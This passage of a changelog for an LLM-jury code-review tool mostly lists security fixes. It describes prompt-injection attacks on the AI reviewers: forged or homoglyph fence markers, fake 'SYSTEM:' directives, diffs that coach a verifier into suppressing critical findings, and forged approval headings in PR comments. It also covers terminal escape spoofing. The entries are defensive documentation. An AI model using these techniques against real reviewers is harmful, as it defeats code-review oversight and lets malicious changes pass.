  categorical rule instead of a numeric trust weight. (#442)

### Fixed
- `jury --doctor` no longer crashes on an oversized/invalid config: `ConfigError` is caught
  and surfaced as a redacted warning like every other config-loading failure. (#441)

## [1.10.0] - 2026-07-11

### Added
- **Google (Gemini) hosted-API adapter** (`vendor = "google-api"`): completes the
  three-vendor hosted-API set alongside `anthropic-api`/`openai-api` — a reviewer
  keyed by just `GEMINI_API_KEY`, no `agy` CLI install or interactive login needed.
  Same `_HostedApiAdapter` base (no subprocess, control-character key validation
  before any request, fixed endpoint). Sends the key via the `x-goog-api-key`
  header rather than Gemini's alternative `?key=...` query-parameter form, since a
  query-string key is a much easier accidental-leak vector than a header. Scaffold
  one with `jury init --agents gemini-api` (#432).
- **Hosted-API reviewer adapters** (`vendor = "anthropic-api"` / `"openai-api"`):
  a reviewer seat keyed by just `ANTHROPIC_API_KEY` / `OPENAI_API_KEY`, needing
  no `claude`/`codex` CLI install or interactive login — useful for CI runners
  and containers where that's impractical. Same stdlib-`urllib`,
  no-subprocess design as the existing `local` adapter, but pointed at the
  vendor's real hosted API with a fixed (non-configurable) endpoint. Scaffold
  one with `jury init --agents claude-api,codex-api` (#430).

## [1.9.8] - 2026-07-06

### Security
- **Scoped `gh` output redaction to error/log paths only.** Failed-`gh` error
  messages now redact **stdout as well as stderr**, and the
  `post_inline_comments` **dry-run payload dump is redacted before it is
  printed** — closing the remaining console/log paths where raw `gh` output
  could surface secrets, while leaving the PR diffs and API JSON that the jury
  consumes untouched (#420).
- **Exception strings in `cli.py`, `commands.py`, `findings.py`, and
  `policy.py` are now redacted** before being printed to stderr or wrapped into
  error messages — extending the `str(exc)` redaction shipped in 1.9.7 to
  config/policy loading, comment parsing, and findings/verdict parsing (#422).

## [1.9.7] - 2026-07-03

### Security
- Exception strings from failed agent spawns, version probes, local-model
  requests, config loading, and live-post steps are now **redacted before
  being wrapped into error/warning messages** — closing the same secret-leak
  class fixed for `gh` CLI stderr in 1.9.6, but for `str(exc)` text raised by
  Python itself.
- Two more unredacted paths in `adapters.py`, missed by the fix above: a CLI's
  raw version-probe output (`raw_version_output`, surfaced via `jury doctor`)
  and the local-model adapter's `URLError.reason` on a connection failure are
  now redacted too.

### Changed
- The website's **"Run review" demo button is now disabled (with an
  explanatory `title`) when zero reviewers are selected**, instead of staying
  clickable and only showing an inline note after the fact.
- The website now has a **skip-to-content link** on every page (home, docs,
  404, coverage report) — hidden until keyboard-focused, then jumps straight
  past the nav to the main content (WCAG 2.4.1 bypass-blocks).

## [1.9.6] - 2026-06-21

### Security
- `gh` CLI subprocess stderr is now **redacted before being wrapped into a
  `RuntimeError`**, so secrets (e.g. `ghp_` GitHub tokens) echoed by a failing
  `gh` call can no longer leak into logs, tracebacks, or CI output.

### Changed
- The website **theme-toggle button now announces the action it will perform**
  ("Switch to light theme" / "Switch to dark theme") via a dynamic `aria-label`
  and `title`, kept in sync with the active theme through a `MutationObserver`
  (covers both the home page and the docs page).
- The website **copy buttons now announce a "Copied" state** to screen readers
  by swapping their `aria-label`/`title` while copying and restoring the
  original values afterwards (install-command and code-block copy buttons).

## [1.9.5] - 2026-06-15

### Fixed
- Theater is now readable on **light-background terminals**. The chrome (title,
  meta, phase strip, separators, transcript, speech bubble) hardcoded white/grey
  foregrounds that vanished on a light theme; it now uses the terminal's default
  foreground (bold/faint), which adapts to both light and dark backgrounds. The
  pixel scene (own dark background) and vendor/verdict colours are unchanged.

### Changed
- Website analytics switched from Google Analytics 4 to **Cloudflare Web
  Analytics** — cookieless and privacy-first, so no cookie-consent banner is
  required (GDPR / ePrivacy / PECR). The CLI still sends no telemetry.

## [1.9.4] - 2026-06-15

### Fixed
- Theater decision banner no longer shows a **doubled ellipsis** ("x… …") when a
  verdict overflows 3 lines; the last line is plain-sliced with a single "…".

## [1.9.3] - 2026-06-14

### Fixed
- **The decision banner now wraps the full verdict** across up to 3 lines on the
  table (ellipsis only if it's still longer), instead of truncating the whole
  verdict to one line — so the rationale is readable in the scene itself (flat +
  pixel).
- Theater transcript lines are now truncated with an ellipsis instead of being
  hard-cut mid-word at the screen edge, and the rolling `DECISION -> …` log line
  records the **short verdict keyword** (e.g. `DECISION -> NEEDS-INFO`) — the full
  rationale lives on the banner, so the transcript no longer ends in an ellipsis.

### Internal
- `theater.py` is now at 100% coverage (covered the ticker, `_fit`/`_wrap_banner`,
  and the verdict-headline branches); overall coverage nudged off the 99% floor.

## [1.9.2] - 2026-06-14

### Fixed
- **Theater clock is now live.** The scene only repainted on each `on_event`, so
  between phases (while agents run, often tens of seconds) it froze and the timer
  jumped in bursts. A background ticker now repaints on an interval so the clock
  ticks smoothly and the scene stays alive; event-driven and ticker repaints
  share a lock (no torn frames), and the ticker is animate-only.
- **Long verdict no longer overflows the decision banner.** A long chair verdict
  headline ran past the table / screen edge; it's now truncated with an ellipsis
  to fit (flat and pixel scenes), and the **full** verdict is shown wrapped under
  "the panel has decided" so the rationale stays readable in the scene.

## [1.9.1] - 2026-06-14

### Security
- **Theater scrubs control / bidi / zero-width characters from terminal output**
  (`docs/security-audit-2026-06-14-theater.md`). The `--theater` scene rendered
  agent-influenced text (finding claims, the verdict line) to the terminal
  without stripping control bytes, so a crafted claim could inject ANSI escapes
  (clear the screen, move the cursor to **spoof the verdict banner**, set the
  title) or use Unicode bidi overrides to spoof text (Trojan Source). `Screen.put`
  — the single render sink — now replaces C0/DEL/C1 and bidi/zero-width format
  characters with a space; trusted styling still arrives via the separate `sgr`
  argument. No Critical/High/Medium remaining after re-audit.

### Fixed
- Website demo: changing the panel/depth now fully **resets the animated
  theater** (the scene is hidden and cleared) so the next run replays from
  scratch with no stale seats, phase marks, or decision banner.

## [1.9.0] - 2026-06-14

### Added
- **Default the theater view from `jury.toml`** (issue #364): `[jury] theater =
  true` and `theater_style = "flat"|"pixel"` so the animated deliberation view
  can be on by default. New CLI flags `--no-theater` and a config-aware
  `--theater-style` override the file per run. Rendering-only — excluded from the
  config hash / cache key, and still TTY-only (falls back to `--live`, and
  `pixel` to `flat`, when unsupported).

### Documentation
- Landing page + `docs/comparison.md`: new comparison row — **animated
  deliberation view (in-terminal)**, an ai-jury-only capability.
- Website demo: the scripted "Run review" now plays an in-browser animated
  theater preview (issue #365).

## [1.8.1] - 2026-06-14

### Fixed
- **`--theater` crashed on a real interactive terminal** with
  `TypeError: resolve_chair() missing 3 required positional arguments`. The
  scene's chair label called the run-time `resolve_chair` with the wrong
  arguments; it now uses a best-effort display name (the run still resolves the
  real chair internally). The crash only fired on a TTY (where the scene
  actually renders), so it slipped past CI — now covered by a `--theater`
  CLI smoke test (flat + pixel + issue/vote) that forces the scene path on.

## [1.8.0] - 2026-06-14

### Added
- **`--theater-style {flat,pixel}`: a pixel-art style for the theater scene.**
  The same live deliberation (same `on_event` flow) rendered as a top-down
  **pixel-art room** — little chibi jurors (hair + eyes + vendor-coloured torso)
  around a wooden table, the speaker haloed and name-inverted, the case / verify
  checklist / decision banner on the table. Drawn into an RGB pixel buffer and
  folded to the terminal via the upper-half-block `▀` (truecolor); needs a
  truecolor + unicode terminal, else it transparently falls back to the default
  `flat` ANSI scene. Pure stdlib. See `docs/theater-design.md`.

### Changed
- `--theater` help text now describes the **deliberation** framing (no
  "courtroom"/"gavel") to match the round-table scene.

### Documentation
- README, `docs/theater-design.md`, and the landing page document both theater
  styles (flat + pixel) with refreshed demos rendered from the real renderer.
- Site: the demo's `jury.toml` preview now grows to fill the controls column and
  scrolls only on overflow (was capped at a fixed height).

## [1.7.0] - 2026-06-14

### Added
- **`--theater`: an animated "deliberation" view of a live run.** Opt-in,
  presentation-only: the models sit around a table and take turns speaking as
  the run moves through review → debate → verify → decision, then decide together
  (no judge) — by panel vote or recorded by the chair. It consumes the real
  `on_event` stream (so it mirrors the actual run; `--mock` drives a
  deterministic demo), is pure-stdlib ANSI, and never touches the structured
  outcome/report/CI gate. Adapts to PR vs issue and chair vs vote, shows debate
  rounds / early-stop / disputes, seats many jurors (compact roster fallback),
  and falls back to the plain `--live` stream on a non-interactive terminal.
  See `docs/theater-design.md`.
- Theater seats use each vendor's own **product brand colour** (24-bit truecolor:
  Anthropic coral, OpenAI teal, Google blue, local violet), matching the
  website's vendor palette; terminals without truecolor degrade to the nearest
  colour.

### Documentation
- README, `docs/theater-design.md`, and the landing page gained a dedicated
  **Theater mode** section with a pixel-art deliberation demo gif.

## [1.6.2] - 2026-06-13

> Security-hardening release. Nine successive same-day re-audits (a seventh
> four-surface audit, a red-team round, then rounds 3–9) — each a red-team pass
> plus an independent convergence sweep — drove the codebase to a clean round
> with **no Critical/High at any point** and no Medium remaining. The bulk of the
> work hardened the CI-gate's verify→verdict→group attachment so an
> attacker-steered verifier verdict can no longer suppress a real finding, and
> closed a class of markdown output-injection into the posted PR/issue comment.
> Also ships the earlier website/UX and performance tweaks. No breaking changes.

### Security
- **Ninth security re-audit** (`docs/security-audit-2026-06-13-round9.md`). A
  determined final red-team of the verdict-attach layer + an independent
  convergence pass (which confirmed no new Medium+ and recommended release); no
  Critical/High. Fixed one more Medium CI-gate bypass, with tests:
  - A rejecting verdict with `line: null` plus a claim-similarity tie could drop
    a co-located critical (the claim-ful counterpart of the round-6 line-less
    wildcard). A rejecting verdict now must pin a concrete line, and on a
    top-similarity tie only the *least*-severe groups are suppressed — so a tie
    can never drag a critical down alongside a benign decoy.
- **Eighth security re-audit** (`docs/security-audit-2026-06-13-round8.md`). A
  red-team of the round-7 verdict-attach fixes + a whole-codebase convergence
  sweep; no Critical/High. Fixed two Medium CI-gate bypasses with a structural
  redesign of verdict→group attachment, all with tests:
  - A verifier `unsupported` verdict aimed at a co-located *lesser* finding (one
    consensus merged into a critical group, or a benign decoy / numbered sibling
    like `parse_v2`/`parse_v3`) could reject the critical and pass the gate.
    Rejection now uses a **member-tier guard** (a verdict can't suppress a group
    via a member less severe than the group's max) and attaches only to the
    **best-similarity tier**, so it dismisses the finding it actually names and
    never a co-located, less-similar critical.
  - Contradictory verdicts (`verified` + `unsupported`) on one finding are now
    resolved in blocking-priority order (verified wins) instead of by the
    verifier's array order (fail-closed).
- **Seventh security re-audit** (`docs/security-audit-2026-06-13-round7.md`). Two
  independent passes (exhaustive gate-flow probe + wide net); no Critical/High.
  Fixed three Medium CI-gate / posted-comment integrity issues, all with tests:
  - **Empty-/unrelated-claim verdict could collaterally reject a co-located
    finding:** a line-ful but claim-less `unsupported` verdict (meant for a
    benign finding sharing a line) also rejected a `critical`, flipping the
    strict gate to PASS. A *rejecting* verdict now requires real claim
    relatedness (exact or Jaccard ≥ 0.5) — it can verify by position but not
    reject what it doesn't name (fail-closed).
  - **Cross-chunk verdict cross-attachment:** on a chunked review, a verdict
    produced for one chunk could reject a real critical in another chunk after
    the global merge. Verdicts are now scoped to their own chunk's files.
  - **CI gate reason line** (posted to the PR) now flattens the blocking
    finding's `file`/`claim`, closing the last markdown-injection sink.
- **Sixth security re-audit** (`docs/security-audit-2026-06-13-round6.md`). Two
  independent gate-integrity passes; no Critical/High. Fixed two Medium CI-gate
  bypasses and one Low, all with tests:
  - **Claim-less, line-less verdict was a file-wide CI-gate wildcard:**
    `orchestrator._verdict_matches_group` treated an empty verdict claim as a
    location match, but a verdict carrying *neither* a `claim` *nor* a `line`
    (a normal/plausible verifier output shape — and exactly what an injected
    diff would coach the verifier to emit) matched **every** finding group in
    the file. An `unsupported` verdict of that shape rejected unrelated
    `critical` groups (bucket → `rejected`), flipping the CI gate from FAIL to
    PASS; under the default `ignore_unverified=True`, mere verdict *ordering*
    decided the outcome. Now an empty-claim match requires a concrete line on
    both the verdict and the finding.
  - **Path case-collapse:** `consensus._normalize_path` lower-cased paths, so on
    a case-sensitive filesystem (Linux/CI) a verdict on `config.py` could reject
    a real critical at `Config.py` and pass the gate (the round-5 fix covered the
    `./` collision but not case). Case-folding is kept for grouping/dedup, but
    the gate-critical verdict match is now case-exact (`fold_case=False`).
  - Run-metadata report strings (rounds decision, skipped agent name/reason,
    agent name/vendor) are now flattened for defense-in-depth (config-controlled
    today, but keeps them from ever breaking the table / forging structure).
- **Fifth security re-audit** (`docs/security-audit-2026-06-13-round5.md`). Two
  independent passes (red-team + deterministic-core sweep); no Critical/High.
  Fixed two Medium issues and one Low, all with tests:
  - **CI-gate path collision:** `consensus._normalize_path` used
    `str.lstrip("./")`, which strips a whole leading run of `.`/`/` and collided
    distinct paths (`.github/x.yml` vs `github/x.yml`, `../auth.py` vs
    `./auth.py`). An attacker could make a verifier "unsupported" verdict on a
    benign sibling path swallow a real critical finding's group and pass the
    gate. Now only a true leading `./` is stripped. (Also backs
    `orchestrator._verdict_matches_group`.)
  - SARIF output (`--format sarif`) drops an invalid `region.startLine`: a
    finding's `line` is parsed from attacker-influenceable reviewer JSON, and a
    forged `"line": 0`/negative value emitted an invalid SARIF region, which
    makes GitHub code-scanning reject the *entire* upload — suppressing every
    finding (denial-of-evidence). Non-positive lines now drop the region so the
    finding still surfaces at file level.
  - `diff --git` mode-change segments with a git-quoted spaced path
    (`"a/x y.py" "b/x y.py"`) are recovered, closing the last path-truncation
    file-hiding vector from an `include` allow-list.
- **Fourth security re-audit** (`docs/security-audit-2026-06-13-round4.md`). A
  red-team pass plus a fresh sweep of under-examined modules; no Critical/High.
  Fixed two Medium issues and one Low, all with tests:
  - Failed-agent error snippets (`AgentResult.error`, attacker-influenced CLI
    stderr) are now flattened before rendering — the report-integrity fix from
    round 3 covered finding fields but missed error strings, so a failed agent
    could forge a `## Verdict APPROVE` heading in the posted comment.
  - Incremental mode now trusts the hidden `arc-reviewed-sha` marker only from
    OWNER/MEMBER/COLLABORATOR comments — an external PR author could otherwise
    forge it to narrow the reviewed range and skip malicious commits.
  - `diff --git` mode-change segments whose path contains `" b/"` are recovered
    correctly (were truncated, hiding the file from an `include` allow-list).
- **Third security re-audit** (`docs/security-audit-2026-06-13-round3.md`). A
  red-team pass plus a fresh sweep of the report/GitHub-post surface; no
  Critical/High. Fixed a newly-found markdown output-injection class and the
  deferred gh-output cap, all with tests:
  - **Report integrity:** attacker-influenced finding text (`claim`/`evidence`/
    `suggested_fix`/`file`) is now flattened to a single line before rendering,
    and `--suggest-patches` bodies are fence-safe — so a finding can no longer
    forge a `## Verdict APPROVE` heading or break a code fence in the markdown
    comment posted to the PR/issue. (The machine CI gate was never affected.)
  - **gh output cap:** `gh` stdout on the `--pr`/`--issue` path is now streamed
    with a 64 MiB ceiling (previously only `--diff-file`/stdin was capped), so a
    hostile huge PR diff can't OOM the process.
  - Inline-comment bodies strip HTML comments so a finding can't forge the
    jury's hidden `<!-- arc-inline -->` markers / perturb dedup.
  - `diff --git` paths for marker-less segments (renames/copies/mode-changes)
    are recovered from the extended header, closing the remaining file-hiding
    vector from the include allow-list.
  - Added vertical presentation-form angle brackets to the homoglyph fence set
    (`PROMPT_VERSION` 6); `cache.load`/`github` json parsing also catch
    `RecursionError` for parity.
- **Red-team re-audit** (`docs/security-audit-2026-06-13-redteam.md`). A
  same-day adversarial pass against the seventh audit's fixes plus a fresh
  full-surface sweep; no Critical/High. Fixed six items, all with tests:
  - Broadened homoglyph fence neutralization after a red-team pass found the
    first set incomplete (small-form `﹤﹥`, heavy ornaments `❮❯`, much-less/
    greater `≪≫`, Canadian-syllabic `ᐸᐳ`, guillemets, and mixed ASCII/homoglyph
    runs all now broken). Bumps `PROMPT_VERSION` to 5.
  - The raw-diff ingest cap is now enforced on **bytes**, not characters (a
    multi-byte UTF-8 input could previously use 3–4× the intended 64 MiB).
  - CLI-adapter error snippets are now redacted before being embedded in the
    report/PR comment, matching the local-adapter path (a crashing CLI could
    otherwise leak a token from stderr).
  - `parse_findings`/`parse_verdicts` now catch `RecursionError` on deeply
    nested JSON, so one steerable reviewer can't abort the whole run.
  - `diff --git` paths containing spaces or git-quoting are recovered from the
    `+++`/`---` marker lines, so a space-named file can no longer evade an
    `include` allow-list (hiding itself from review).
- **Seventh security audit** (`docs/security-audit-2026-06-13.md`). Four-surface
  re-audit of `main`; no Critical/High. Fixed two Medium prompt-injection gaps
  and two Low issues, all with new tests:
  - The debater's own round-1 review is now wrapped in an `UNTRUSTED_REVIEW`
    fence like every other untrusted-derived slot (it was neutralized but not
    fenced), so injected text surviving into a reviewer's output can no longer
    land in a region the anti-injection preamble treats as trusted. Bumps
    `PROMPT_VERSION` to 4 (cache invalidation).
  - `neutralize_sentinels` now also breaks fences forged from fullwidth/
    homoglyph angle brackets (e.g. `＜＜＜UNTRUSTED_DIFF`), which previously
    evaded the ASCII-only matcher while still reading as a real fence to an LLM.
  - `redact_url_userinfo` now redacts credentials in scheme-less endpoint URLs
    (`user:pass@host/v1`), which `urlsplit` previously left in the path so the
    credential slipped through unredacted (continues v1.5.0/L-1).
  - Raw diff ingestion (`--diff-file`/stdin) is now bounded by a 64 MiB ceiling
    so a hostile huge input cannot OOM the process before the post-split
    `diff.max_bytes` budget engages.
  - The #336 combined classification regex was verified equivalent to the prior
    per-regex matching and free of catastrophic backtracking.

### Changed
- Website demo "Run review" button now shows "Running review..." while a run is
  in progress, making the loading state explicit.
- Added an `aria-label` to the install-command copy button so screen readers
  announce what it copies.
- Reduced redundant work in security-path classification and PR-level risk
  scoring (combined-regex path matching in `diffprofile`, single-pass
  `_risk_level`).

## [1.6.1] - 2026-06-11

> Patch release for the post-v1.6.0 hardening, performance, accessibility, and
> repository-quality work. No breaking changes.

### Security
- **Post-v1.6.0 security re-audit** (`docs/security-audit-2026-06-07-v1.6.0.md`). A sixth re-audit — four independent surface reviews (subprocess/sandbox, network/SSRF, prompt-injection/redaction, filesystem/cache + classification) with the key claims confirmed empirically — verifies every #287–#322 fix holds in the released v1.6.0 source. It is the **first round with no Critical, High, *or* Medium finding**: prompt-injection coverage is now complete (the M-1 verdicts slot is fenced + neutralized), least privilege and SSRF are fail-closed, and cache integrity holds under tamper/forgery. Only optional, non-attacker-reachable defense-in-depth notes remain (scheme-less `redact_url_userinfo` early-return, no hard diff byte cap, `LocalAdapter` runtime SSRF gate, unknown-vendor flag retention, string-based loopback allow-list). The superseded intermediate Claude reports are removed; their history lives in this changelog.

### Changed
- Improved report/rendering performance by reducing repeated list-extension and string-join work in report assembly.
- Combined security keyword classification regexes so repeated classification passes do less redundant matching.
- Improved website accessibility with semantic form grouping, visible keyboard focus states, and clearer disabled-button styling.
- Applied repository-wide Ruff lint and formatting cleanups across source, benchmark helpers, and tests.

## [1.6.0] - 2026-06-07

> Closes the four post-v1.5.0 re-audit findings (#321, #322), each cross-vendor
> jury-reviewed. The one untrusted slot left raw — the synthesis verdicts
> addendum — is now fenced + neutralized; endpoint userinfo is stripped
> structurally; two long-standing matcher bugs (classification keyword stems,
> nested redaction) are fixed.

### Security
- **Synthesis verdicts addendum is now fenced + neutralized** (#321, completes #316/L-1). The `VERIFICATION VERDICTS` block appended to the synthesis prompt was the one untrusted slot left un-fenced and un-neutralized — a verdict's `claim`/`reasoning` transitively quote attacker diff text, so it could forge a fence closer or a fake `SYSTEM:` directive in the chair's prompt. It is now wrapped in an `UNTRUSTED_FINDINGS` fence and run through `neutralize_sentinels`, matching every other untrusted slot. (The CI gate stays consensus-derived, so this only ever affected the human-facing synthesis text.)
- **Re-audit low-severity bundle** (#322). The init-endpoint credential display now strips userinfo **structurally** via a shared `redaction.redact_url_userinfo` helper (used by `jury init` and `doctor`), so a short (<6-char) password or a colon-less bare token — which the `basic_auth` regex missed — can no longer leak to stdout/CI logs; `redact()` also gains a colon-less userinfo arm and a lower password bound for the diff-scrub path (L-1, residual of #316/L-7). The `vulnerab`/`exploit` classification keyword stems are now compiled with a trailing `\w*` instead of `\b…\b`, so `vulnerability`/`exploitable`/`exploited` are correctly recognized as security-sensitive (L-2). Redaction no longer re-redacts an already-emitted `[REDACTED:…]` marker, so a secret inside a basic-auth URL keeps its informative kind and an accurate count (L-3).
- **Post-v1.5.0 security re-audit** (`docs/security-audit-2026-06-07-v1.5.0.md`). A fifth four-surface re-audit confirmed every #287–#316 fix holds in source (no Critical/High; filesystem/cache surface fully clean) and surfaced one Medium (the un-fenced verdicts slot) plus three Lows — **all fixed in this release (#321, #322).**

## [1.5.0] - 2026-06-07

> Closes the post-v1.4.1 re-audit findings (#314, #315, #316), each cross-vendor
> jury-reviewed. New behavior: the injection scanner caps hits per kind, config /
> policy TOML files are size-capped (4 MiB), and redaction covers a few more
> token formats.

### Security
- **`injection.scan` is now O(N), not O(N²)** (#314). It recomputed each hit's line via `text.count(...)` (O(index)) and emitted one hit per matched char, so a long run of zero-width characters cost quadratic time — 200k zero-width chars ≈ 6.6 s, a CPU-exhaustion DoS since `scan_inputs` runs on the full per-chunk diff before fan-out. Now newline offsets are computed once and the line is found by binary search, and hits are capped per kind; 200k ≈ 86 ms, linear.
- **Config validation returns a clean error on a malformed endpoint** (#315, completes #309). `config._endpoint_issues` called `urlsplit` unguarded, which raises `ValueError` on a malformed URL (`http://[::1`), so `validate_config` crashed with a stack trace instead of a `ConfigError`. The `urlsplit`/hostname access is now guarded; a non-UTF-8 config/policy file is likewise a clean `ConfigError`/`PolicyError`.
- **Re-audit low-severity bundle** (#316). The prior-round debate addendum (`prior_txt`) is now fenced and run through `neutralize_sentinels` like every other untrusted slot (L-1). Redaction adds SendGrid / PyPI / npm tokens and Slack webhook URLs (L-2). `cache clear()` only touches files matching the 64-hex cache-name shape, so it can't delete unrelated files in a shared `JURY_CACHE_DIR` (L-3). Cache entries are written via `tempfile.mkstemp` (O_EXCL, no symlink-follow) instead of a predictable pid-tagged temp (L-4). Config/policy TOML reads are size-capped at 4 MiB (L-5). The privilege audit recognizes the `=`-form sandbox (`-s=`/`--sandbox=`) the enforcement already accepts, so a safe config no longer false-positives under `--strict` (L-6). The `jury init --local-endpoint` value is redacted before being echoed to stdout (L-7).
- **Post-v1.4.1 security re-audit** (`docs/security-audit-2026-06-07-v1.4.1.md`) confirmed every #287–#310 fix holds (no Critical/High) and stress-tested #309/#310 (alternate loopback encodings all fail closed; unknown-vendor sandbox fail-closed). The two Mediums and seven Lows it surfaced are all fixed in this release (#314, #315, #316).

## [1.4.1] - 2026-06-07

> Closes the two Medium residuals the post-v1.4.0 re-audit surfaced (#309, #310),
> each cross-vendor jury-reviewed. No config/flag changes.

### Security
- **The read-only sandbox is now fail-closed for an unknown vendor** (#310, completes #300). #300 made the audit *warn* for an unsandboxed non-claude reviewer, but `privilege.enforce_read_only` still injected **no** sandbox for an unknown vendor, so in default (non-strict) mode it ran fail-open. An unknown vendor routes to the generic `AgyAdapter`, so it now gets `--sandbox` injected like agy — an agy-compatible CLI runs sandboxed, an incompatible one fails on the flag rather than running unsandboxed. `local` (network) agents stay out of scope.
- **`jury init --local-endpoint` is gated by the SSRF endpoint validation** (#309). The config-file path was validated by `_endpoint_issues`, but the `init --list-models`/`--list-agents` discovery path called `list_local_models()` directly, so it could GET an arbitrary host. The gate now lives inside `list_local_models` itself, so **every** caller is covered: a non-`http(s)` scheme or a non-loopback host (without `JURY_ALLOW_REMOTE_ENDPOINT`) returns `[]` with no network call.
- **Post-v1.4.0 security re-audit** (`docs/security-audit-2026-06-07-v1.4.0.md`). A third four-surface re-audit of the released code confirms every #287–#303 fix holds in source (no Critical/High). It surfaces two **Medium** residuals — the unknown-vendor adapter path still runs **fail-open** (no sandbox injected) in default mode even though #300 made the audit warn, and `jury init --local-endpoint` reaches an arbitrary host **without** the `_endpoint_issues` SSRF gate the config path enforces. **Both Mediums are fixed in this release (#310, #309).** The minor items it noted (init endpoint not redacted in stdout, explicit TLS context, `prior_txt` debate slot not neutralized, more secret formats, `cache clear()` glob blast-radius, atomic-write temp via `mkstemp`) remain tracked for follow-up.

## [1.4.0] - 2026-06-07

> Security re-audit follow-up (#300–#303). All #287–#296 fixes re-confirmed in
> source; the remaining defense-in-depth gaps are closed. Behavior notes: the
> least-privilege audit now warns for **any** unsandboxed non-claude reviewer
> (more `--strict` failures for loose configs), and `PROMPT_VERSION` was bumped
> (the result cache invalidates once). Each change was cross-vendor jury-reviewed.

### Security
- **Post-v1.3.0 security re-audit** (`docs/security-audit-2026-06-07-v1.3.0.md`). A four-surface re-audit of the released code confirms every #287–#296 fix holds in source (no Critical/High) and documents the remaining defense-in-depth gaps: the read-only sandbox guarantee is not yet unconditional for an **unknown vendor** (no sandbox injected, no privilege warning), the **untrusted-content sentinel fences aren't neutralized** against an embedded closing token, redaction still misses **basic-auth URLs / Azure / GCP** secret formats, and the `detect_capabilities` version probe doesn't kill its process group on timeout. Tracked as #300–#303.
- **The privilege audit now flags any unsandboxed non-claude reviewer** (#300). `audit_agent` previously warned only when a *dangerous flag* was present, so an unknown-vendor (or no-flag) agent that ran via the generic adapter produced **zero** warnings — and `--strict` couldn't fail it on that basis. It now warns whenever a non-claude agent isn't under a recognized read-only sandbox (`-s read-only` / `--sandbox`), closing the audit blind spot; a `local`/HTTP agent (no subprocess to sandbox) is correctly out of scope. (`--strict` already rejected an unknown vendor via config validation; this makes the default-mode gap visible too.)
- **Untrusted-content sentinel fences are neutralized before interpolation** (#301). The prompt templates wrap the diff/context/reviews in `<<<UNTRUSTED_X … UNTRUSTED_X>>>` fences; a diff that embedded a closing/opening sentinel verbatim could break out of (or forge) a fence. `prompts.neutralize_sentinels` now breaks any `<<<`/`>>>` run adjacent to an `UNTRUSTED_` marker in untrusted values (using a visible middle dot, not a zero-width char the injection scanner would flag) before every `format()`; the injection scanner still surfaces the attempt and the structured CI gate remains authoritative. `PROMPT_VERSION` bumped to 3 (cache invalidation).
- **Redaction now covers basic-auth URLs, Azure `AccountKey=`, and GCP service-account JSON keys** (#302). Added a `basic_auth` pattern that redacts the password in `scheme://user:password@host` (preserving the `://user:`…`@` structure so the URL stays readable; an empty username `https://:TOKEN@host` is covered too), added `account[_-]?key` to the assignment keywords (Azure `AccountKey=`/connection strings; `SharedAccessKey=` was already covered via `access_key`), and made the assignment separator tolerate a quoted key so a GCP `"private_key_id": "…"` JSON field is redacted while a non-secret like `"client_email"` is not.
- **Low-severity hardening bundle from the re-audit** (#303). The `detect_capabilities` version probe now runs through `_spawn`, so it too starts a new process group and kills the whole group on timeout (L-1, matching the main run path). The injection scanner's invisible-character set is extended to direction marks (LRM/RLM/ALM), invisible math operators, soft hyphen, CGJ, Mongolian vowel separator, and Hangul fillers, and its base64 heuristic now covers URL-safe `-_` (L-2). The cache `clear()` also rotates (deletes) the per-user `.hmac_key` (L-3); entries are written atomically via a temp file + `replace` (L-4); and a cache file is size-capped (8 MiB) before parsing so a giant attacker-planted entry can't be read into memory before its MAC is rejected (L-5).

## [1.3.0] - 2026-06-07

> Security-hardening release (audit + fixes for #287–#296). A few defaults are
> tightened and may require action: a **non-loopback local-model `endpoint`** is
> now rejected unless you set `JURY_ALLOW_REMOTE_ENDPOINT=1`, a **relative-path
> agent `command`** (e.g. `./bin/x`) is rejected (use a bare name or absolute
> path), and the **read-only sandbox is always enforced** for reviewers.

### Changed
- **README: the version badge now reads from PyPI** (#281). The `github/v/release` shields.io badge frequently rendered "Unable to select next GitHub token from pool" (a transient failure of shields.io's shared GitHub token pool); swapped for `pypi/v/ai-jury`, which uses a different, more reliable source and shows the actually-installable version.

### Added
- **Docs: a live dogfood case study** (`docs/case-study-dogfood-v1.2.0.md`, in the docs portal). Logs the jury (codex + agy + qwen, no Claude) reviewing the five PRs that became v1.2.0: 5 real bugs caught before merge (incl. a crash and a check-disabling bypass) **and** 3 false positives the chair wrongly "verified" — with the honest lesson that a non-executing verifier confirms plausible-but-wrong findings, so a panel is a high-recall finder that still needs executed verification.

### Security
- **A whole-codebase security audit** (`docs/security-audit-2026-06-07.md`) — static review across four attack surfaces (subprocess/sandbox, network/SSRF, prompt-injection/redaction, filesystem/parsing) with the High findings verified in source. Tracked as #288–#293.
- **The read-only sandbox is now enforced at the adapter layer, not left to config** (#288). The mandatory restriction flags lived entirely in each agent's `extra_args`, so an empty or misconfigured `jury.toml` (`extra_args = []`, a dropped `--disallowed-tools`/`-s read-only`/`--sandbox`) produced a write/tool-capable reviewer of an attacker-controlled diff, and the privilege audit only *warned*. `build_argv` now passes `extra_args` through `privilege.enforce_read_only`, which **guarantees** claude's write tools are in `--disallowed-tools` (merging into any existing value), and injects the secure-default sandbox for codex (`-s read-only`) / agy (`--sandbox`) when none is configured. Config may still knowingly *widen* a codex sandbox (an audited opt-in), but can no longer *remove* the restriction. Local (network) and unknown vendors are left untouched.
- **The privilege audit no longer trusts a bare `--sandbox` token blindly** (#292). `_is_sandboxed` is now vendor-aware: only the agy/gemini boolean `--sandbox` counts as a bare sandbox, while a codex sandbox must carry an explicit restricting value (`read-only`). A misleading `["--sandbox", "--dangerously-skip-permissions", "--yolo"]` on a non-agy vendor — previously judged "fully safe" — is now correctly surfaced.
- **Review prompts are delivered on stdin, never as process arguments** (#287). `claude -p <prompt>` and `agy --print <prompt>` placed the prompt — which embeds the redacted diff and PR/issue context — in argv, where any same-host process/user could read it via `ps`/`/proc/<pid>/cmdline`. Both now pipe the prompt on stdin (matching codex), so no real adapter exposes prompt content in the process list. Verified the CLIs read stdin in print mode (claude 2.1.x, agy 1.0.6).
